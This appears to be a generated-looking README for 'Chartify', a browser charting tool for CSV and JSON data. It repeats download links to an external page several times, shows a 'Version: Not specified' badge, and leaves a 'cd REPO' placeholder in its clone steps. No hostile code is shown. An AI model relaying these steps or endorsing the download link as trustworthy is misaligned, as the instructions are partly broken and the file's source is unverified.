# Chartify - Data Visualization 2026

> **Chartify is a local-first, single-file charting tool for web browsers. It converts CSV files and JSON arrays into bar, line, and pie charts, then exports them as SVG or high-resolution PNG files.**

[![Platform](https://img.shields.io/badge/Platform-Web%20browser-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Not%20specified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/mooreryanqqnd8826/chartify-csv-chart-tool?style=flat-square)](https://github.com/mooreryanqqnd8826/chartify-csv-chart-tool)

---

<p align="center">
  <a href="https://mooreryanqqnd8826.github.io/chartify-csv-chart-tool/">
    <img src="https://img.shields.io/badge/Download-Chartify%20Latest-brightgreen?style=for-the-badge" alt="Download Chartify">
  </a>
</p>

> **[Download Chartify](https://mooreryanqqnd8826.github.io/chartify-csv-chart-tool/)**

---

[Download Latest Build](https://mooreryanqqnd8826.github.io/chartify-csv-chart-tool/)

---

## Overview

Chartify provides a quick way to transform structured data into visual reports directly in a browser. Import a CSV file or JSON array, choose the fields to use as labels and values, and generate a bar, line, or pie chart.

The complete application is contained in one HTML file and operates locally in the browser. The data remains in the local workflow instead of being uploaded, and both dark and light themes are available. Finished charts can be exported as SVG graphics or high-resolution PNG images.

---

## Key Features

- Turn structured data into bar, line, or pie charts.
- Load CSV files and JSON arrays.
- Map specific columns to chart labels and values.
- Export charts in SVG format.
- Create high-resolution PNG exports.
- Generate charts locally without uploading data.
- Choose between dark and light interface themes.
- Run a single-file application with no third-party dependencies.

---

## Installation

### Get the Application

1. Visit the [latest Chartify build](https://mooreryanqqnd8826.github.io/chartify-csv-chart-tool/).
2. Save the single HTML application file.
3. Open it with a modern web browser.

### Clone from Git

```bash
git clone https://github.com/mooreryanqqnd8826/chartify-csv-chart-tool.git
cd REPO
```

After cloning, open the Chartify HTML file directly in your browser. There is no package installation or build process.

---

## Using Chartify

1. Open the Chartify HTML file in a web browser.
2. Import CSV data or enter a JSON array.
3. Choose the field that supplies the chart labels.
4. Choose the field containing the numeric values.
5. Select a bar, line, or pie visualization.
6. Set the dark or light theme as desired.
7. Export the completed chart as SVG or high-resolution PNG.

Example JSON array:

```json
[
  { "month": "January", "sales": 120 },
  { "month": "February", "sales": 175 },
  { "month": "March", "sales": 150 }
]
```

For this data, assign `month` to the label field and `sales` to the value field.

---

## Configuration

Chartify has no external configuration file. The browser interface provides controls for:

- Choosing the input format
- Assigning label and value columns
- Selecting the chart style
- Changing between dark and light themes
- Exporting SVG and PNG files

Since Chartify is both single-file and local-first, the HTML application can remain alongside a data workflow or be opened whenever a chart is required.

---

## Requirements

- A modern browser with JavaScript enabled.
- CSV data or a JSON array suitable for charting.
- Local storage for the application file and exported charts.
- No server, package manager, or third-party dependency setup.

---

## Frequently Asked Questions

### What kinds of charts can Chartify create?

Chartify generates bar charts, line charts, and pie charts.

### Which data formats are supported?

The input can be a CSV file or a JSON array. Once the data is loaded, choose the fields that represent labels and values.

### Does Chartify work without an internet connection?

Yes. It is a single-file browser application that runs locally, and chart data is not uploaded.

### Is there a separate settings file?

No. Chartify exposes its options through the application controls. Theme and chart settings are selected during the current session.

### How can I save a chart?

Use the SVG export when you need a vector graphic, or choose high-resolution PNG to save an image file.

### What can I do if no chart is displayed?

Check that the source is valid CSV or a JSON array. Then confirm that the selected label and value fields contain compatible data, and make sure JavaScript is enabled in the browser.

### Where can I find newer builds?

Get the newest version from the [Chartify download page](https://mooreryanqqnd8826.github.io/chartify-csv-chart-tool/).

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
